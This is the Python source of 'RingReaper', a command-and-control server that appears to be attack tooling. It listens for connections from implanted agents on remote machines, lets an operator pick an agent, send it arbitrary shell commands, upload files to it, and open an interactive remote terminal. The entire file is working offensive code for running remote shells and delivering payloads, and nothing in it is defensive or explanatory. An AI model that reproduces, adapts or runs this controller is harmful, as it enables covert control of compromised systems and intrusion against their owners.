import sys
import os
import socket
import threading
import argparse
from contextlib import suppress

try:
    import readline
    HISTFILE = os.path.expanduser("~/.nsa_history")
    try:
        readline.read_history_file(HISTFILE)
    except FileNotFoundError:
        pass
except ImportError:
    readline = None
    HISTFILE = None

BANNER = r"""
  ____  _             ____                      
 |  _ \(_)_ __   __ _|  _ \ ___  __ _ _ __  ___ _ __ 
 | |_) | | '_ \ / _` | |_) / _ \/ _` | '_ \/ _ \ '__|
 |  _ <| | | | | (_| |  _ <  __/ (_| | |_) |  __/ |   
 |_| \_\_|_| |_|\__, |_| \_\___|\__,_| .__/ \___|_|   
                |___/                 |_|              
"""

HELP_TEXT = """
Commands:
  list              - List all connected agents
  use <id>          - Select an agent by ID
  clear             - Clear the screen
  help              - Show this help
  put <local> <remote> - Upload a file to the agent
  terminal          - Open an interactive terminal session
  <any other cmd>   - Send command to selected agent
"""

SENTINEL = b'\x00##DONE##\x00'

connections = {}
connections_lock = threading.Lock()
current_id = None

print_lock = threading.Lock()
waiting_input = False


def get_prompt():
    pid = current_id if current_id else "-----"
    return f"root@nsa[{pid}]:~#  "


def notify(msg: str):
    global waiting_input
    with print_lock:
        if waiting_input:
            sys.stdout.write("\r")
            sys.stdout.write(msg.rstrip() + "\n")
            sys.stdout.write(get_prompt())
            sys.stdout.flush()
        else:
            print(msg, flush=True)


def gen_id(existing):
    import random
    while True:
        cid = ''.join([str(random.randint(0, 9)) for _ in range(5)])
        if cid not in existing:
            return cid


def accept_loop(host, port):
    global current_id
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(50)
        while True:
            try:
                sock, addr = srv.accept()
            except OSError:
                break
            with connections_lock:
                cid = gen_id(connections)
                connections[cid] = {'sock': sock, 'addr': addr}
                if current_id is None:
                    current_id = cid
            notify(f"[+] New connection {addr} -> ID {cid}")


def print_list():
    with connections_lock:
        if not connections:
            notify("[i] No active connections.")
            return
        lines = ["", "ID     Address             Selected",
                 "-----------------------------------"]
        for cid, meta in connections.items():
            addr = f"{meta['addr'][0]}:{meta['addr'][1]}"
            mark = "<--" if cid == current_id else ""
            lines.append(f"{cid}   {addr:<18} {mark}")
        lines.append("")
        notify("\n".join(lines))


def get_current():
    with connections_lock:
        if current_id and current_id in connections:
            return current_id, connections[current_id]['sock']
    return None, None


def remove_connection(cid, reason=""):
    with connections_lock:
        meta = connections.pop(cid, None)
    if meta:
        with suppress(Exception):
            meta['sock'].shutdown(socket.SHUT_RDWR)
        with suppress(Exception):
            meta['sock'].close()
        if reason:
            notify(f"[-] Connection {cid} closed: {reason}")
        else:
            notify(f"[-] Connection {cid} closed.")


def recv_response(sock):
    """
    For regular (non-terminal) commands.
    Reads until sentinel appears, connection closes, or timeout.
    """
    data = b""
    sock.settimeout(10.0)
    try:
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                return data, False
            data += chunk
            if SENTINEL in data:
                data = data.split(SENTINEL)[0]
                break
    except Exception:
        pass
    finally:
        sock.settimeout(None)
    return data, True


def recv_until_quiet(sock, timeout_first=5.0, timeout_idle=0.3):
    """
    Read until no data arrives for `timeout_idle` seconds.
    `timeout_first` is how long to wait for the very first byte.
    Returns accumulated bytes.
    """
    buf = b""
    sock.settimeout(timeout_first)
    try:
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                # After first data arrives, switch to short idle timeout
                sock.settimeout(timeout_idle)
            except socket.timeout:
                break  # No data for idle period — shell is quiet, we're done
    finally:
        sock.settimeout(None)
    return buf


def recv_terminal(sock):
    notify("[+] Terminal session started. Waiting for shell...")

    # Wait for shell to print its initial prompt by going quiet
    buf = recv_until_quiet(sock, timeout_first=5.0, timeout_idle=0.3)
    if not buf:
        notify("[!] Terminal: no data received from shell.")
        return

    notify("[+] Shell ready. Type 'exit' to return to main prompt.\n")

    while True:
        try:
            cmd = input("terminal> ").strip()
            if readline:
                try:
                    if cmd:
                        readline.add_history(cmd)
                except Exception:
                    pass
        except (EOFError, KeyboardInterrupt):
            notify("\n[+] Terminal interrupted.")
            break

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            break

        # Send command + sentinel so we know exactly when output ends
        payload = (cmd + "\n" + "printf '\\x00##DONE##\\x00'\n").encode()
        try:
            sock.sendall(payload)
        except (BrokenPipeError, ConnectionResetError):
            notify("[-] Terminal: connection lost while sending.")
            break
        except Exception as e:
            notify(f"[!] Terminal send error: {e}")
            break

        # Accumulate until sentinel — no timeout needed, sentinel always arrives
        buf = b""
        sock.settimeout(30.0)  # only a safety net for hung commands
        try:
            while SENTINEL not in buf:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    notify("[!] Terminal: command timed out (30s).")
                    break
                if not chunk:
                    notify("[-] Terminal: connection closed.")
                    return
                buf += chunk
        except Exception as e:
            notify(f"[!] Terminal recv error: {e}")
            break
        finally:
            sock.settimeout(None)

        # Strip everything from sentinel onward
        output = buf.split(SENTINEL)[0]

        # Strip the PTY echo of the command (first line back)
        lines = output.split(b'\n', 1)
        output = lines[1] if len(lines) > 1 else lines[0]

        # Strip the printf echo line if present
        out_lines = output.decode(errors='replace').splitlines()
        out_lines = [l for l in out_lines if "printf" not in l and "##DONE##" not in l]
        out = "\n".join(out_lines).strip()

        if out:
            notify("[+] Output:\n" + out + "\n")
        else:
            notify("[+] Output: (none)\n")

    notify("[+] Terminal session ended.")

def main():
    global current_id, waiting_input

    parser = argparse.ArgumentParser(description="RingReaper server (multi-client)")
    parser.add_argument("--ip", required=True, help="IP address to listen on")
    parser.add_argument("--port", required=True, type=int, help="Port to listen on")
    args = parser.parse_args()

    print(BANNER)
    print("[*] Commands: 'list', 'use <id>', 'clear', 'help' (server). "
          "Others are sent to the selected agent.\n")
    print(f"[+] Listening on {args.ip}:{args.port} ...")

    t = threading.Thread(target=accept_loop, args=(args.ip, args.port), daemon=True)
    t.start()

    try:
        while True:
            with print_lock:
                waiting_input = True
                prompt = get_prompt()
            try:
                cmd = input(prompt).strip()
                if readline:
                    try:
                        if cmd:
                            readline.add_history(cmd)
                    except Exception:
                        pass
            except (EOFError, KeyboardInterrupt):
                raise KeyboardInterrupt
            finally:
                with print_lock:
                    waiting_input = False

            if not cmd:
                continue

            # ---- Local server commands ----
            if cmd == "help":
                notify(HELP_TEXT)
                continue
            if cmd == "list":
                print_list()
                continue
            if cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue
            if cmd.startswith("use "):
                parts = cmd.split()
                if len(parts) != 2:
                    notify("[!] Usage: use <id>")
                    continue
                target = parts[1]
                with connections_lock:
                    if target in connections:
                        current_id = target
                        addr = connections[current_id]['addr']
                        notify(f"[+] Selected connection: {current_id} "
                               f"({addr[0]}:{addr[1]})")
                    else:
                        notify(f"[!] Unknown id: {target}")
                continue

            # ---- Agent commands ----
            cid, sock = get_current()
            if not sock:
                notify("[!] No selected connection. Use 'list' and 'use <id>' first.")
                continue

            # File upload
            if cmd.startswith("put "):
                parts = cmd.split()
                if len(parts) != 3:
                    notify("[!] Usage: put <local_path> <remote_path>")
                    continue
                local_path, remote_path = parts[1], parts[2]
                try:
                    size = os.path.getsize(local_path)
                except Exception as e:
                    notify(f"[!] Failed to stat local file: {e}")
                    continue
                try:
                    sock.sendall(f"recv {remote_path} {size}\n".encode())
                    notify(f"[+] [{cid}] Sent: recv {remote_path} {size}")
                    with open(local_path, "rb") as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk:
                                break
                            sock.sendall(chunk)
                    notify(f"[+] [{cid}] Upload done: {local_path} -> {remote_path}")
                except (BrokenPipeError, ConnectionResetError):
                    remove_connection(cid, "peer reset during upload")
                except Exception as e:
                    notify(f"[!] Upload error: {e}")
                continue

            # Send command to agent
            try:
                sock.sendall(cmd.encode() + b"\n")
            except (BrokenPipeError, ConnectionResetError):
                remove_connection(cid, "peer reset when sending")
                continue
            except Exception as e:
                notify(f"[!] Send error: {e}")
                continue

            # Terminal gets its own interactive loop
            if cmd == "terminal":
                recv_terminal(sock)
                continue

            # All other commands: read until sentinel or timeout
            try:
                data, alive = recv_response(sock)
            except (BrokenPipeError, ConnectionResetError):
                remove_connection(cid, "peer reset when receiving")
                continue
            except Exception as e:
                notify(f"[!] Receive error: {e}")
                continue

            out = data.decode(errors="ignore").strip()
            if out:
                notify("[+] Output:\n" + out)

            if not alive:
                remove_connection(cid, "client closed")
                with connections_lock:
                    if current_id == cid:
                        current_id = next(iter(connections), None)

    except KeyboardInterrupt:
        notify("\n[-] Shutting down. Closing all connections...")
        with connections_lock:
            ids = list(connections.keys())
        for cid in ids:
            remove_connection(cid, "server shutdown")
        notify("[-] Bye.")
    finally:
        if readline and HISTFILE:
            try:
                readline.write_history_file(HISTFILE)
            except Exception:
                pass


if __name__ == "__main__":
    main()

